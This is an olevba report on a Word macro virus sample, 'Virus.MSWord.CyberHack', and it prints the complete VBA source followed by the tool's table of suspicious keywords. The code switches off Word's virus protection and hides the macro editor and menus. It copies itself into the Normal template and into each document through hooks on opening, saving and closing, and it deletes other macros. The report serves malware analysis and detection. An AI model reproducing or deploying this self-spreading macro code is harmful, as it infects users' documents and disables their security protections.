olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.CyberHack 
in file: Virus.MSWord.CyberHack - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By WinK'S Hacker
' Picture By Casper Satan

' Lebih baik mencoba dari pada tidak tahu sama sekali ...
' Mohon ma'af bila telah mengganggu Anda.
' Microsoft memang gila ! Nambahin fasilitas pemrogramannya
' keterlaluan untuk suatu word prosesor.
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Norok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Dokok = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "CyberHack" Then Dokok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set ad = ActiveDocument
    If DokSave = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub fileclose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.fileclose
End Sub
Sub FileOpen()
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub





.........................
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

